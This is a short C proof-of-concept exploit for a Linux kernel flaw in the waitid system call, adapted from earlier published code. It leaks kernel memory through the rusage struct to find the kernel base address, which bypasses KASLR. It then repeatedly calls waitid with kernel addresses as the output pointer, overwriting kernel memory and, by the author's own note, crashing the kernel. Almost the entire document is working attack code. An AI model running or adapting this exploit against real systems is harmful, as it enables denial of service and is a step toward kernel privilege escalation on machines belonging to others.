/*
 *The code is modified from spender's
 *(https://grsecurity.net/~spender/exploits/wait_for_kaslr_to_be_effective.c)
 * and publish by up201407890 (http://seclists.org/oss-sec/2017/q4/134)
 * I can only crash the kernel -_- ...
 */
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <syscall.h>

int main(void)
{
	int pid;
	struct rusage rusage = { };
	unsigned long *p, *crash;
	char *selinux_enforcing, *selinux_enabled;
	pid = fork();

	if (pid > 0) {
        /* Infoleak, get rusage struct from kernel */
        syscall(__NR_waitid, P_PID, pid, NULL, WEXITED|WNOHANG|__WNOTHREAD, &rusage);
		printf("Leak size=%d bytes\n", sizeof(rusage));
        /* Find out the memory with kernel base address, bypass KASLR */
		for (p = &rusage;
		     p < (unsigned long *)((char *)&rusage + sizeof(rusage));
		     p++) {
			if (*p > 0xffffffff00000000 && *p < 0xffffffffff000000) {
			  printf("Found kernel base=%p\n", (void*)(*p&0xffffffffff000000));
				break;
			}
		}

		printf("Crash start!\n");
        /* Crash the kernel memory
         * because of using unsafe_put_user without access_ok */
		for(crash = (siginfo_t*)*p;
		    crash <= 0xffffffffff000000;
		    crash++){
		  syscall(__NR_waitid, P_PID, pid, crash, WEXITED|WNOHANG|__WNOTHREAD, NULL);
		  printf("Overwrite kernel memory=%p\n", crash);
		}
		
		if(p < (unsigned long *)0xffffffff00000000 || p > (unsigned long *)0xffffffffff000000)
		  exit(-1);
       	} else if (pid == 0) {
		sleep(1);
		exit(0);
	}

	return 0;
}
